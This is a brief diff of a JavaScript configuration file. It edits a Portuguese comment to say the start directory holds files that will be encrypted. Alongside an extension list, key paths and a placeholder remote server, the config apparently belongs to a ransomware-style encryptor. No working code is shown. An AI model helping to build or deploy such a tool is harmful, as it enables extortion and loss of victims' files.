@@ -3,7 +3,7 @@ const extensions = require("./extensions");
 
 const devConfig = {
     remoteServer:"https://yourdomian.com",
-    startDirectory: "./files",  // Tipo de Dir do sys
+    startDirectory: "./files",  // dir dos arqvs que seram crypt(p/ cada sys diferente) 
     extensions,
     symetricKeyPath: path.join(__dirname, "..", "secret.key"),
     privateKeyPath: path.join(__dirname, "..", "private.key"),
